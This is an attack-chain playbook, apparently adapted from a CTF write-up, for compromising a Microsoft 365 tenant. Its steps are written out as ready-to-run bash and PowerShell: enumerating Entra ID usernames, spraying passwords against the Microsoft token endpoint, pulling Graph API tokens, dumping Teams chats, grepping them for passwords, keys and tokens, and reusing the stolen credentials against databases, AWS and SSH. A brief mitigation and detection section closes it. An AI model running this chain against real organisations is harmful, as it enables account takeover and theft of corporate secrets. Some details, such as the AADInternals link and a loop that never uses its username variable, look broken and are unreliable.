# Username Spray to Teams Credential Exfiltration

## Chain Summary
**Entry Point:** Username enumeration (response length / redirect status)  
**Severity:** High  
**Source:** https://kabinet.gitbook.io/ctf-writeup/2025/thuderdome/a-new-wave-web-of-deceit

Exploits Entra ID user enumeration to build target list, performs credential spray to identify valid accounts, detects MFA gaps, then leverages Graph API and AADInternals to extract plaintext credentials shared in Teams messages. Single reconnaissance-to-exfil chain targeting organizational communication security gaps.

---

## Chain: Username Enum → Spray → MFASweep Detection → Graph Auth → Teams Message Exfil

### [1] Entra ID Username Enumeration (Response Differential)
- **Trigger:** Target organization domain known; need to enumerate valid usernames for spray attack
- **Prereq:** Target domain; web browser or curl with ability to test login endpoints
- **Method:**
  ```bash
  # Approach 1: getuserrealm endpoint (unauthenticated, timing-based)
  for user in $(cat wordlist.txt); do
    echo "Testing $user..."
    curl -s 'https://login.microsoftonline.com/getuserrealm.srf?login='"$user"'&xml=1' \
      | grep -q "NameSpaceType" && echo "[VALID] $user" >> valid_usernames.txt
  done
  
  # Approach 2: Response body length differential (valid vs. invalid user)
  # Valid user: "NameSpaceType: Managed" / "NameSpaceType: Federated"
  # Invalid user: Error or shorter response
  curl -s 'https://login.microsoftonline.com/getuserrealm.srf?login=nonexistent@target.com&xml=1' | wc -c  # ~200 bytes
  curl -s 'https://login.microsoftonline.com/getuserrealm.srf?login=admin@target.com&xml=1' | wc -c     # ~400 bytes
  
  # Approach 3: HTTP redirect status (valid user → longer process, specific redirects)
  for user in $(cat wordlist.txt); do
    status=$(curl -s -o /dev/null -w "%{http_code}" -L 'https://login.microsoftonline.com/oauth2/authorize?client_id=...' | tail -c 3)
    [ "$status" = "200" ] && echo "[VALID] $user" >> valid_usernames.txt
  done
  
  # Tool-based enumeration (faster)
  python3 o365userfinder.py -u wordlist.txt -d target.com 2>/dev/null | grep VALID
  ```
- **Yields:** List of valid Entra ID usernames (email/UPN format)

### [2] Credential Spray (MSOLSpray / oh365userfinder)
- **Trigger:** Valid username list compiled; need to identify accounts with weak/default passwords
- **Prereq:** Username list (valid_usernames.txt); password wordlist (e.g., rockyou.txt, custom password list); spray tool
- **Method:**
  ```bash
  # Tool: MSOLSpray or oh365userfinder
  python3 MSOLSpray.py -U valid_usernames.txt -P passwords.txt -o spray_results.txt -t 1
  
  # Manual spray (curl-based)
  for user in $(cat valid_usernames.txt); do
    for pass in $(head -100 passwords.txt); do  # Limit per user to avoid lockout
      response=$(curl -s -X POST "https://login.microsoftonline.com/common/oauth2/token" \
        -d "grant_type=password" \
        -d "username=$user" \
        -d "password=$pass" \
        -d "client_id=d3590ed6-52b3-4102-aedd-a47eb6b5b65d" \
        -d "scope=https://graph.microsoft.com/.default")
      
      if echo "$response" | jq -e '.access_token' >/dev/null 2>&1; then
        echo "[+] VALID CRED: $user:$pass" | tee -a spray_results.txt
        # Extract tokens for later use
        echo "$response" | jq -r '.access_token' > tokens/$user.token
        break
      fi
    done
  done
  ```
- **Yields:** Valid credentials (UPN + password) for one or more compromised accounts; access tokens for Graph API

### [3] MFA Gap Detection (Invoke-MFASweep)
- **Trigger:** Valid credentials obtained; need to identify accounts without MFA for privileged access
- **Prereq:** Valid Entra ID credentials; PowerShell environment or MFASweep tool; target tenant ID
- **Method:**
  ```bash
  # Check MFA status for each valid credential
  # Approach 1: MFASweep tool (PowerShell)
  # (Requires Windows or PowerShell Core with AADInternals module)
  Invoke-MFASweep -OutputFile "mfa_status.txt"
  
  # Approach 2: Graph API MFA check (via curl)
  # Get user's MFA registration status
  ACCESS_TOKEN="<token_from_spray>"
  curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
    "https://graph.microsoft.com/v1.0/me/authentication/methods" | jq '.value[] | {id, type}'
  
  # Approach 3: Check Conditional Access policies (may reveal MFA gaps)
  curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
    "https://graph.microsoft.com/beta/identity/conditionalAccess/policies" \
    | jq '.value[] | {displayName, conditions: .conditions.applications}'
  ```
- **Yields:** List of users without MFA protection; identify high-value targets (no second factor required)

### [4] Service Principal Authentication (Graph API Access)
- **Trigger:** Compromised user account identified without MFA; need to escalate to Graph API with high privileges
- **Prereq:** Valid user credentials; ability to authenticate as the user or create/compromise a service principal; target tenant ID
- **Method:**
  ```bash
  # Option 1: Direct user token (if already obtained from spray)
  # Token already has some Graph API scope; request additional scopes if needed
  TOKEN=$(cat tokens/compromised_user.token)
  
  # Option 2: Obtain higher-privilege token (if user has admin role)
  TENANT_ID="<target_tenant_id>"
  USER="<compromised_user@target.com>"
  PASS="<compromised_password>"
  
  curl -s -X POST "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token" \
    -d "grant_type=password" \
    -d "username=$USER" \
    -d "password=$PASS" \
    -d "client_id=d3590ed6-52b3-4102-aedd-a47eb6b5b65d" \
    -d "scope=https://graph.microsoft.com/.default offline_access" \
    | jq -r '.access_token' > graph_token.txt
  
  # Option 3: If user owns a service principal (app registration)
  # Enumerate apps owned by user, extract client secret, authenticate as SP
  curl -s -H "Authorization: Bearer $TOKEN" \
    "https://graph.microsoft.com/v1.0/me/ownedObjects?$filter=isof('microsoft.directoryManagement/application')" \
    | jq '.value[] | {id, appId, displayName}'
  ```
- **Yields:** Graph API access token with elevated permissions (possible scopes: Chat.Read.All, Mail.Read, Directory.Read.All, etc.)

### [5] Teams Message Extraction (AADInternals / Graph API)
- **Trigger:** Graph API token with `Chat.Read.All` or `Mail.Read` permissions; need to exfiltrate plaintext credentials from Teams
- **Prereq:** Graph API token (from step 4); target team/channel or user DM; AADInternals module or direct Graph API access
- **Method:**
  ```bash
  # Approach 1: AADInternals module (PowerShell — requires Windows or PowerShell Core)
  # First, load AADInternals
  Install-Module AADInternals -Force
  Import-Module AADInternals
  
  # Extract Teams messages (requires user context)
  Get-AADIntTeamsMessages -AccessToken $token | Export-Csv teams_messages.csv
  
  # Approach 2: Direct Graph API to list chats and messages
  GRAPH_TOKEN=$(cat graph_token.txt)
  
  # List all chats
  curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
    "https://graph.microsoft.com/v1.0/me/chats" \
    | jq '.value[] | {id, topic, preview}'
  
  # Extract messages from a specific chat
  CHAT_ID="<chat_id>"
  curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
    "https://graph.microsoft.com/v1.0/chats/$CHAT_ID/messages" \
    | jq '.value[] | {from: .from.user.displayName, timestamp: .createdDateTime, body: .body.content}'
  
  # Search for sensitive keywords in messages
  curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
    "https://graph.microsoft.com/v1.0/me/chats?$filter=contains(tolower(topic), 'password') or contains(tolower(topic), 'secret')" \
    | jq '.value[] | {id, topic}'
  ```
- **Yields:** Plaintext Teams messages; search results containing credentials, API keys, passwords shared in chat

### [6] Credential Extraction & Parsing
- **Trigger:** Teams messages extracted; need to parse and identify plaintext credentials
- **Prereq:** CSV/JSON export of Teams messages; ability to grep/parse text
- **Method:**
  ```bash
  # Parse exported CSV for credential patterns
  cat teams_messages.csv | awk -F',' '{print $NF}' > message_bodies.txt
  
  # Search for sensitive patterns
  grep -iE "password|pwd|secret|key|token|access.?key|credential|api.?key" message_bodies.txt
  
  # Example patterns to extract
  grep -oE "password['\"]?\s*[:=]\s*['\"]?[^'\"]*['\"]?" message_bodies.txt
  grep -oE "AWS_SECRET_ACCESS_KEY['\"]?\s*[:=]\s*['\"]?[^'\"]*['\"]?" message_bodies.txt
  grep -oE "Bearer\s+[A-Za-z0-9._-]+" message_bodies.txt  # JWT tokens
  
  # Extract credentials mentioned in casual conversation
  # (Common anti-pattern: "Just FYI, admin password is P@ssw0rd123")
  grep -iE "password.*is|credentials.*are|key.*is" message_bodies.txt
  ```
- **Yields:** Plaintext credentials, API keys, JWT tokens, SSH keys, database passwords, etc. shared in Teams messages

### [7] Lateral Movement & Privilege Escalation
- **Trigger:** Plaintext credentials extracted from Teams
- **Prereq:** Extracted credentials; target service identifiable
- **Method:**
  ```bash
  # Use extracted credentials for lateral movement
  # Database credentials
  psql -h db.internal -U admin -p 5432 --password "$(grep -oE "password.*" teams_msg.txt | cut -d' ' -f3)"
  
  # AWS credentials
  export AWS_ACCESS_KEY_ID="<extracted_key>"
  export AWS_SECRET_ACCESS_KEY="<extracted_secret>"
  aws sts get-caller-identity
  
  # Shared SSH keys / PEM files
  grep -o "-----BEGIN.*-----.*-----END.*-----" teams_messages.csv | head -1 > extracted_key.pem
  chmod 600 extracted_key.pem
  ssh -i extracted_key.pem admin@target.internal
  
  # Admin account credentials
  curl -X POST "https://admin-panel.target.com/login" \
    -d "username=admin&password=<extracted_password>"
  ```
- **Yields:** Authenticated access to backend systems; database access; cloud infrastructure; flag/sensitive data exfiltration

---

## Mitigation & Detection

**Prevention:**
- **MFA Enforcement:** Require MFA tenant-wide, no exceptions
- **Data Loss Prevention (DLP):** Implement Teams DLP policies to prevent sharing of credentials, API keys, SSNs
- **Message Retention & Audit:** Enable Teams Message Audit logging; set retention policies to auto-delete sensitive chats after N days
- **Secrets Management:** Use Azure Key Vault, managed secrets, or encrypted channels — never share plaintext credentials in Teams
- **Conditional Access:** Restrict Teams access to compliant devices; enforce step-up authentication for sensitive data access
- **User Training:** Educate staff NOT to share passwords, API keys, or credentials in chat (even "temporarily")
- **Least Privilege:** Limit Chat.Read.All and Mail.Read permissions to necessary service principals only

**Detection:**
- **Teams Audit Logs:** Monitor for bulk message downloads or unusual access patterns
- **Graph API Rate Limiting:** Alert on high-volume Chat.Read.All or Mail.Read API calls from non-standard clients
- **Microsoft Defender for Cloud:** Detect anomalous Teams API access (impossible travel, unusual locations, bulk exports)
- **DLP Alerts:** Alert on sensitive data (regex patterns: passwords, API key formats, credit card numbers) sent in Teams
- **Conditional Access Logs:** Monitor for risk-based sign-ins or policy violations during Teams access
- **Log Aggregation:** Feed Teams audit logs and Azure Sign-In logs to SIEM; correlate with credential spray and MFA bypass attempts

---

## References
- Entra ID User Enumeration: https://learn.microsoft.com/en-us/azure/active-directory/reports-monitoring/overview-sign-ins
- AADInternals (GitHub): https://github.com/Gerelith/aad-internals
- Graph API Chat/Teams Access: https://learn.microsoft.com/en-us/graph/api/chats-list?view=graph-rest-1.0
- Microsoft Teams Security Best Practices: https://learn.microsoft.com/en-us/microsoftteams/security-best-practices-for-identity
